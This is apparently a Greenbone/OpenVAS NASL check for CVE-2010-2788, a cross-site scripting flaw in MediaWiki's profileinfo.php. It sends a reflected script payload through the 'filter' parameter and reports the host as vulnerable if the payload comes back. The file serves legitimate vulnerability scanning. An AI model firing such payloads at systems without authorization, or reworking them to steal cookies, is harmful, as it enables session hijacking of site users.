CPE = "cpe:/a:mediawiki:mediawiki";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801877" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-05-11 15:50:14 +0200 (Wed, 11 May 2011)" );
	script_cve_id( "CVE-2010-2788" );
	script_bugtraq_id( 42024 );
	script_tag( name: "cvss_base", value: "2.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:N/I:P/A:N" );
	script_name( "MediaWiki 'profileinfo.php' Cross Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_mediawiki_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "mediawiki/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site." );
	script_tag( name: "affected", value: "MediaWiki versions before 1.15.5" );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user-supplied input passed via
  the 'filter' parameter to profileinfo.php, which allows attackers to execute
  arbitrary HTML and script code on the web server." );
	script_tag( name: "solution", value: "Upgrade to MediaWiki versions 1.16.0 or 1.15.5." );
	script_tag( name: "summary", value: "This host is running MediaWiki and is prone to cross site scripting
  vulnerability." );
	script_xref( name: "URL", value: "https://bugzilla.redhat.com/show_bug.cgi?id=620225" );
	script_xref( name: "URL", value: "https://bugzilla.redhat.com/show_bug.cgi?id=620226" );
	script_xref( name: "URL", value: "http://svn.wikimedia.org/viewvc/mediawiki?view=revision&revision=69984" );
	script_xref( name: "URL", value: "http://svn.wikimedia.org/viewvc/mediawiki?view=revision&revision=69952" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://www.mediawiki.org/wiki/Download" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/profileinfo.php?filter=\"><script>alert(document.cookie)</script>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "><script>alert\\(document\\.cookie\\)</script>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

